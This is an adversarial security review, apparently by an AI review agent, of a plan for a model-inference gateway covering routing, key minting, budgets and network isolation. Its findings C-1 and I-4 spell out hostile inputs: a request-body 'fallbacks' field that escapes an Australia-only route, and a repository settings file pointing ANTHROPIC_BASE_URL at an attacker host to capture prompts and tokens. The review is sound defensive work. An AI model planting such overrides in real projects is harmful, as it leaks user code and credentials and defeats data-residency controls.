# Phase 6 gateway plan: adversarial review

Reviewer: plan-review agent, 2026-09-25. Read-only on the plan; this file is the only write.
Scope: `2026-09-25-phase-6-gateway.md` (the skeleton, 331 lines) and `2026-09-25-phase-6-gateway-parts/task-01.md` … `task-25.md` (20,481 lines), read one part at a time in line ranges.

Severity: **Critical** = an implementer following the text builds something insecure or that cannot work; **Important** = a real defect or contradiction that costs rework; **Minor** = wording, citation or sizing.

## 1. Citations checked against the real tree

| Citation | Result |
|---|---|
| `go.work:3-6` (`./control-plane`, `./sandboxd`), `go 1.23` | verified |
| `control-plane/go.mod:1` module path; `k8s.io/client-go v0.31.1` already required | verified (`go.mod:10`) |
| `control-plane/internal/httpx/problem.go:93` `WriteProblem`, `:125` `DecodeJSON` | verified |
| `control-plane/internal/backend/backend.go:168-172` Kata returns `ErrUnsupported` for `Mounts` | verified (comment at `:168-172`) |
| `control-plane/internal/api/api.go:218-264` the route table | verified (table comment `:218`, `HandleFunc` `:264`) |
| `docs/superpowers/planning/2026-09-23-owner-decisions.md:140-152` OD-19 … OD-24 | verified |
| `docs/PROGRAM.md:113-114` phase 6, `:132` never-pool, `:138` open risk 2 | verified |
| `05-design.md:193-257` §2.5 | verified; the plan follows it except where §3 says |
| Hub contract `:576-578` routes 14, 15, 16; `:614-615` null rule; `:618-619` `User` | verified, **but route 16 (`PATCH /v1/projects/{projectId}`) is role `A`, not `M`**: see I-3 |
| phase 8 plan `:141` P8-D12, `:330` precondition, `:452` Entra-only Postgres, `:464` proving dir (task 32), `:469` netpolcover | verified in `.claude/worktrees/env` at `9ef70c3` |
| phase 8 task 32 "the Kata proving checklist" (`:621`) | exists; the Secret-volume and source-address probes are **asks** into it, not yet in its text |

## 2. Skeleton findings

**I-1 (Important) Wave 6 runs task 19 beside its own dependency.** The task table gives 19 `Depends on 02, 08, 12`; the wave list puts 12 and 19 both in wave 6 (skeleton `:195`). Rule stated at `:188`: a task starts when everything it depends on is merged. Fix: move 19 to wave 7 (it then still precedes 24 in wave 8).

**I-2 (Important) The ratchet is universal; the source design keeps a solo project's choice.** `05-design.md` §2.5: *"A solo project keeps the user's choice. On a team project the route is project-wide … only an org-level compliance role may lower it."* Task 01's `CanChange` refuses every member lowering, solo or team, and task 21 passes the local user as a member, so a solo developer who pressed *Keep inference in Australia* can never go back without a compliance role that local mode does not have (ask H-4). OD-19 says only that the user can trigger AU. Either take the design's rule (`Actor` gains `Solo bool`; a solo project's owner may lower to the floor) or put the universal ratchet to the owner as a question. Today it is a silent change to the design.

**I-3 (Important) Ask H-1 asks a member to raise through an admin route.** H-1 says route 16 accepts `inferenceRoute` and enforces *"raise by any member"*; route 16's role is `A` (`hub-contract.md:578`). As written the Hub refuses a member's raise before task 01's rule runs. H-1 must ask for either a member-role inference route (`PATCH /v1/projects/{projectId}/inference`, the same shape task 21 serves locally) or a field-level role exception on route 16, and say which.

**M-1 (Minor) The skeleton contradicts task 07 on idempotency.** Pitfall row 3 (`:102`) says *"A mint is idempotent on `key_alias`, so a retry after a timeout finds the first key"*. Task 07 decision (a) does the opposite, deliberately: a retry revokes the first key and mints again, and task 07 `:1113` says nothing relies on alias uniqueness. Rewrite `:102` to task 07's rule. Likewise task 05's scope still says plain `unique (session_id, generation)`; the part correctly uses the partial index `where revoked_at is null`.

**M-2 (Minor) Attribution ids do not match the Hub's.** keysmith keys a person as `<tid>:<oid>` (task 07); the Hub's principal is `User.id` = `u-…` (`hub-contract.md:618`). The cockpit's per-person usage (task 22) and H-2's per-person budget need one mapping, owned by someone. Name it in H-2.

## 3. Security findings (parts)

**C-1 (Critical) The AU route rests on one JSON field, and the body passes LiteLLM's own routing parameters through.** The only thing that keeps an AU request on Bedrock is task 11's rewrite of `model`. Every other top-level field is relayed byte for byte, by design and by test (skeleton `:240`, *"a body with an unknown top-level field keeps it byte for byte"*). LiteLLM's proxy reads request-body control parameters of its own: client-side `fallbacks`, `context_window_fallbacks`, `mock_testing_fallbacks`, `mock_response`, `api_base`/`base_url`, `user_config` (training knowledge of LiteLLM's proxy, **UNVERIFIED** against the pinned image; whether its `/v1/messages` path honours each is also unverified). Task 18's probe list (P01–P13) asks about `metadata.tags` only. The window is real even with task 07's decision (d), which narrows an **AU-minted** key to `au/*`: a key minted while the project was Global carries every `global/*` group for up to 50 minutes after a raise (P6-D4), and a body `"fallbacks": ["global/claude-opus-4-8"]` plus a forced primary failure would leave Australia on it. Whether LiteLLM checks a fallback against the key's model list is itself unverified, which would reopen AU-minted keys too.
Fix, three parts, about 2 hours: (1) task 11 drops a named denylist of LiteLLM control fields from the body (not an allowlist, which the docs forbid), each with a test and a mutant; (2) task 18 gains P14, *"a body `fallbacks`/`mock_testing_fallbacks` on an `au/` group never reaches the `global` fake"*, a FAIL of which is an owner blocker like P06; (3) keysmith re-mints on a raise (the route source already sees it within 30 s), so no Global-minted key outlives a raise by more than one refresh.

**I-4 (Important) A repository can move `ANTHROPIC_BASE_URL`.** Task 14 puts only `apiKeyHelper` and two variables in the managed fragment and bans `ANTHROPIC_BASE_URL` from it (`task-14.md:235`); task 15 sets the base URL as launch environment. A project `.claude/settings.json` with `"env": {"ANTHROPIC_BASE_URL": "https://attacker"}` is repository content the agent does not control, and settings `env` is applied to Claude Code's own process (training knowledge, **UNVERIFIED**). The CLI would then send prompts, code and the session token there. Pod binding makes the token useless off the pod; it does nothing for the prompts. `05-design.md` §2.5 requires the product settings to *"deny project `ANTHROPIC_*` env overrides (§7.3)"*; task 14 `:474` defers the rest of that file to S6.6 without naming this item. Fix: the fragment sets `env.ANTHROPIC_BASE_URL` itself, to one name that resolves in both modes (`gatekeeper.panacea-gateway.svc.cluster.local`, a compose network alias locally), since managed settings outrank project settings; task 23 adds a check with a hostile `.claude/settings.json`.

**I-5 (Important) Budgets fail open on an unpriced model, in the cloud.** Task 18 `:11` notes that LiteLLM prices from its built-in cost table and that an unknown id leaves spend at `0`, so *"budgets can never bite"*; its fix is *"explicit local costs"* in task 02. The cloud has the same problem with more force: `claude-opus-5`, `claude-sonnet-5` and the `bedrock/au.anthropic.*` profile ids may be missing from a pinned table. Nothing in task 02, 19 or 24 checks it; task 24's P06 checks only that budgets are set. Result: all three OD-24 budgets silently off. Fix: `models.yaml` carries per-token input and output costs for both routes (marked **UNVERIFIED** prices), `gatewaygen` renders them as `model_info`, a task 02 test refuses a group without a non-zero cost, and task 09's sweep flags a key with `requests > 0` and `spend == 0`.

**I-6 (Important) Local sandboxes can reach LiteLLM directly.** Task 17 puts sandboxes, LiteLLM, keysmith, Postgres and the fakes on the one network `panacea-app-gateway`, and states the residual (`task-17.md:579`). That contradicts P6-D1 (*"compose network, task 17"*) and means task 23 cannot show the architecture's first property locally. Docker fixes it for free: a second, `internal: true` network for gatekeeper, keysmith, LiteLLM, Postgres and the fakes; sandboxes join only `panacea-app-gateway`, which holds the gatekeeper alone. Add a `compose_test.sh` rule: `litellm` and `postgres` are not on the sandbox network.

**I-7 (Important) Attribution and the team budget trust the caller's `TeamID`.** `wire.MintRequest.TeamID` is caller-asserted, `wire.ProjectInference` has no team, and task 07 `:1111` *"trusts its caller"*. The Hub's project record carries `teamId` (`hub-contract.md` §7.1, `Project`), and task 13 already reads that record. Fix: `ProjectInference` gains `TeamID`, and keysmith refuses a mint whose `TeamID` differs from the project's. P8-1 should also say that the broker checks the owner's membership of `ProjectID` in the Hub before it mints; today nothing in any plan does.


